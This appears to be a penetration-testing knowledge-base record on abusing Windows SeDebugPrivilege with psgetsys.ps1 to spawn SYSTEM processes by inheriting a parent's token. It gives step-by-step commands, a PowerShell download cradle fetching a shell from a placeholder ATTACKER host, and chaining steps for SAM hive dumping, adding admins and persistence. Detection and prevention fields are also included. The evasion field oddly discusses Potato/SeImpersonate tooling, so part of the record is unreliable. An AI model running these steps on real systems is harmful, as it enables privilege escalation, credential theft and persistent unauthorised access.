examples.label: Spawn your command as a child of that PID

notes:
=== SeDebugPrivilege — psgetsystem (Parent Process Token Theft) ===
Spawn a SYSTEM child process by inheriting a SYSTEM parent's token — no credential dumping needed.

=== WHEN TO USE THIS OVER LSASS DUMP ===
No interactive users logged in → no useful credentials in LSASS
Credentials already known → just need SYSTEM shell for next step
RunAsPPL=1 on LSASS → can't dump LSASS, but can steal another SYSTEM process token
Non-interactive context (web shell, reverse shell) → need SYSTEM execution not credentials

=== ATTACK FLOW ===
1. Confirm SeDebugPrivilege (elevated session)
2. Find a SYSTEM process PID:
   tasklist | findstr lsass
   Get-Process winlogon | Select-Object Id
3. Load the script:
   Import-Module .\psgetsys.ps1
4. Execute:
   [MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, "cmd.exe", "")
   Third argument "" is required by the PoC — do not omit

=== FOR NON-INTERACTIVE CONTEXTS ===
Replace "cmd.exe" with reverse shell binary path:
[MyProcess]::CreateProcessFromParent(<PID>, "C:\ProgramData\shell.exe", "")
Or PowerShell download cradle:
[MyProcess]::CreateProcessFromParent(<PID>, "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')", "")

=== CHAINING CONTEXT ===
SeDebugPrivilege → psgetsystem → SYSTEM → add local admin → persistent RDP access
SYSTEM shell → reg save HKLM\SAM + HKLM\SYSTEM → secretsdump offline → local hash crack
Developer account with RDP + SeDebugPrivilege (common in dev environments) → reliable SYSTEM
SYSTEM shell → deploy persistence → maintain access after password changes

=== WHAT TO LOOK FOR ===
SeDebugPrivilege in GPO on non-admin dev accounts = critical finding
Assigned via: Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment
Any account with SeDebugPrivilege = direct SYSTEM path via psgetsystem
Combine with LSASS path for dual-approach: credentials + SYSTEM shell simultaneously

recommended.note: Same privilege used to dump creds instead.

name: SeDebugPrivilege - psgetsystem Parent Process
description: Using SeDebugPrivilege, psgetsys.ps1 spawns a child process from a SYSTEM-owned parent (e.g. an lsass/winlogon PID from tasklist), inheriting a SYSTEM token to run a command.

defense.why_it_works: psgetsys.ps1 exploits SeDebugPrivilege by calling CreateProcessFromParent to spawn a new process inheriting the token of a target SYSTEM process (e.g., winlogon.exe). Since SeDebugPrivilege allows opening any process, the new process inherits the SYSTEM token without requiring any vulnerability — it is a direct privilege abuse via process token inheritance.
defense.prerequisites: SeDebugPrivilege in current token (local administrator). psgetsys.ps1 script. A target SYSTEM process PID to borrow the token from.
defense.impact: Instant SYSTEM shell with full privileges by inheriting any SYSTEM process token. No CVE or patch required — pure privilege abuse.
defense.detection: psgetsys.ps1 import and execution (PowerShell Script Block Logging). CreateProcessFromParent API call by non-SYSTEM process. Sysmon Event 1: child process of winlogon.exe created by unexpected parent. SYSTEM process spawned from unexpected user context.
defense.artifacts: PowerShell transcript: psgetsys.ps1 imported | Sysmon Event 1: process created with unexpected parent PID | Process list: cmd.exe or PowerShell running as SYSTEM with winlogon.exe as parent
defense.prevention: Restrict SeDebugPrivilege: in high-security environments, remove from local Administrators via GPO. Enable PowerShell Script Block Logging and Module Logging. Deploy Sysmon with parent-child process anomaly detection. Use JEA (Just Enough Administration) instead of granting full admin rights.
defense.misconfiguration: Full local administrator rights granted broadly — includes SeDebugPrivilege by default. No PowerShell logging. No Sysmon to detect parent-process spoofing.
defense.vulnerable_config:
# psgetsys creates SYSTEM process:
Import-Module .\psgetsys.ps1
# Target PID 612 = winlogon.exe (SYSTEM)
[MyProcess]::CreateProcessFromParent(612, 'cmd.exe', '')
# Returns cmd.exe running as SYSTEM
defense.secure_config:
# Restrict SeDebugPrivilege via GPO:
# Computer Configuration > Windows Settings > Security Settings > Local Policies
# > User Rights Assignment > Debug programs
# Remove Administrators, add only specific accounts if needed

# PowerShell logging:
Set-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging -Name EnableModuleLogging -Value 1

# Sysmon rule: alert on winlogon.exe spawning unexpected children
defense.evasion: Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel.
